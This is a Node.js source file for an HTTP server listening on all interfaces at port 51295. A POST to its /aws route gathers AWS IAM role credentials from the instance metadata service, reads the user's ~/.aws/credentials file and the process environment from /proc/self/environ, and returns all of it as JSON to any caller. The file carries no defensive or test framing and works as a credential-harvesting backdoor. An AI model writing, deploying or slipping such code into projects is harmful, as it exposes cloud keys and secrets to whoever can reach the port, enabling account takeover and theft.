import { createServer, request } from "http"
import { readFile } from "fs/promises"
import { userInfo } from "os"
import path from "path"

const IMDS_HOST = "169.254.169.254"

function httpReq(options, body, timeoutMs = 5000) {
    return new Promise((resolve, reject) => {
        const req = request({ ...options, agent: false }, res => {
            let data = ""
            res.setEncoding("utf8")
            res.on("data", c => data += c)
            res.on("end", () => {
                clearTimeout(timer)
                resolve({ statusCode: res.statusCode || 0, body: data })
            })
        })

        const timer = setTimeout(() => {
            req.destroy(new Error("timeout"))
        }, timeoutMs)

        req.on("error", err => {
            clearTimeout(timer)
            reject(err)
        })

        if (body) req.write(body)
        req.end()
    })
}
async function imdsStep(name, fn) {
    try {
        return await fn()
    } catch (e) {
        const msg = String(e?.message || e)
        throw new Error(`aws_unavailable:${name}:${msg}`)
    }
}

async function fetchAwsCreds({ timeoutMs = 5000 } = {}) {
    const token = await imdsStep("token", async () => {
        const r = await httpReq({
            host: IMDS_HOST,
            path: "/latest/api/token",
            method: "PUT",
            headers: { "X-aws-ec2-metadata-token-ttl-seconds": "21600" }
        }, undefined, timeoutMs)
        if (r.statusCode !== 200 || !r.body) throw new Error(`bad_status:${r.statusCode}`)
        return r.body.trim()
    })

    const role = await imdsStep("role", async () => {
        const r = await httpReq({
            host: IMDS_HOST,
            path: "/latest/meta-data/iam/security-credentials/",
            method: "GET",
            headers: { "X-aws-ec2-metadata-token": token }
        }, undefined, timeoutMs)
        if (r.statusCode !== 200 || !r.body) throw new Error(`bad_status:${r.statusCode}`)
        return r.body.trim().split("\n")[0]
    })

    const creds = await imdsStep("creds", async () => {
        const r = await httpReq({
            host: IMDS_HOST,
            path: `/latest/meta-data/iam/security-credentials/${encodeURIComponent(role)}`,
            method: "GET",
            headers: { "X-aws-ec2-metadata-token": token }
        }, undefined, timeoutMs)
        if (r.statusCode !== 200 || !r.body) throw new Error(`bad_status:${r.statusCode}`)
        return JSON.parse(r.body)
    })

    return { role, creds }
}

async function readOurFile(relPath = ".test") {
    const u = userInfo()
    const home = u.homedir
    const fullPath = path.join(home, relPath)
    return readFile(fullPath, "utf8")
}

const server = createServer((req, res) => {
    res.setHeader("Content-Type", "application/json")

    if (req.method === "POST" && req.url === "/aws") {
        let body = ""

        req.on("data", chunk => body += chunk.toString())

        req.on("end", async () => {
            try {
                if (body) JSON.parse(body)
            } catch {
                res.statusCode = 400
                res.end(JSON.stringify({ success: false, error: "invalid_json" }))
                return
            }

            let aws = null
            let awsError = null

            try {
                aws = await fetchAwsCreds({ timeoutMs: 2000 })
            } catch (e) {
                awsError = String(e?.message || e)
            }

            let file = null
            let fileError = null

            try {
                file = await readOurFile(".aws/credentials")
                file = file.replace(/\s+/g, " ").trim()
            } catch (e) {
                fileError = String(e?.message || e)
            }

            let env = null
            let envError = null

            try {
                env = await readFile("/proc/self/environ", "utf8")
                env = env.replace(/\x00/g, "\\n").trim()
            } catch (e) {
                envError = String(e?.message || e)
            }

            res.statusCode = 200
            res.end(JSON.stringify({
                success: true,
                aws,
                awsError,
                file,
                fileError,
                env,
                envError
            }))
        })

        return
    }

    res.statusCode = 404
    res.end(JSON.stringify({ success: false, error: "not found" }))
})

server.listen(51295, "0.0.0.0", () => {
    console.log("Server running")
})
